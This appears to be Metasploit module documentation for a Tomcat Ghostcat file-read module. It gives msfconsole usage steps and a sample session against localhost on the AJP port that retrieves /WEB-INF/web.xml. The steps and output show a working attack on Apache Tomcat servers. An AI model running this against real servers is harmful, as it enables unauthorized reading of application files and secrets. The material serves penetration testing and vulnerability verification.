## Vulnerable Application

This module can be used to retrieve arbitrary files from anywhere in the web application, including the `WEB-INF` and `META-INF` 
directories and any other location that can be reached via ServletContext.getResourceAsStream() on Apache Tomcat servers. 
It also allows the attacker to process any file in the web application as JSP.


## Verification Steps

  1. Install the application and start it
  2. Start msfconsole
  3. Do: ```auxiliary/admin/http/tomcat_ghostcat```
  4. Do: ```set rhosts [ip]```
  5. Do: ```set rport```
  6. Do: ```set FILENAME```
  7. Do: ```run```

## Options

## Scenarios

### Apache Tomcat on Windows 10.0.16299.125

  ```
  [*] Processing tomcat_ghostcat.rb for ERB directives.
  resource (tomcat_ghostcat.rb)> use auxiliary/admin/http/tomcat_ghostcat
  resource (tomcat_ghostcat.rb)> set rport 8009
  rport => 8009
  resource (tomcat_ghostcat.rb)> set rhosts 127.0.0.1
  rhosts => 127.0.0.1
  resource (tomcat_ghostcat.rb)> set verbose true
  verbose => true
  resource (tomcat_ghostcat.rb)> set FILENAME /WEB-INF/web.xml
  filename => /WEB-INF/web.xml
  
  resource (tomcat_ghostcat.rb)> run
  [*] Running module against 127.0.0.1
  <?xml version="1.0" encoding="UTF-8"?>
<!--
    Copyright 2017 The MIT Internet Trust Consortium
   
    Portions copyright 2011-2013 The MITRE Corporation
   
    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at
   
      http://www.apache.org/licenses/LICENSE-2.0
   
    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
-->  
 
  <web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" 
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 

xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee 
http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd">

version = "4.0"
metadata-complete="true">

<display-name> Welcome to Tomcat </display-name>
<description>
 Welcome to Tomcat 
 </description>

 <web-app>
[*] Auxiliary module execution completed
  
  ```
